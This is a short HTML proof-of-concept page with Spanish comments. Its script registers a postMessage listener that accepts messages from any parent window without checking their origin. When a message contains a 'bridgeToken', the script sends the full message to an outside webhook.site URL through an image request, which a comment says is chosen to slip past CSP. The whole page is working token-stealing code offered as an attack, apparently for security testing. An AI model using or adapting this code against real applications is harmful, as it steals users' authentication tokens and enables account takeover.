<!DOCTYPE html>
<html>
<body>
    <h2>Interceptando bridgeToken...</h2>
    <pre id="log" style="background:#000; color:#0f0; padding:10px; min-height:100px;"></pre>

    <script>
        const logEl = document.getElementById('log');
        const webhookUrl = "https://webhook.site/118f2af5-6014-4c45-ab14-1543fc773f54";

        function log(msg) {
            logEl.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
        }

        // Escuchar CUALQUIER mensaje del padre
        window.addEventListener("message", (event) => {
            const dataString = JSON.stringify(event.data);
            log(`📩 Mensaje de ${event.origin}: ${dataString}`);

            // Si contiene el token, exfiltramos
            if (dataString.includes("bridgeToken")) {
                log("🚨 ¡BRIDGE TOKEN ENCONTRADO!");
                
                // Exfiltramos vía Image Tag (evita CSP)
                const img = new Image();
                img.src = `${webhookUrl}?bridge_token=true&data=${encodeURIComponent(dataString)}`;
                log("📤 Token enviado al webhook.");
            }
        });

        log("Listener activo. Esperando token...");
    </script>
</body>
</html>
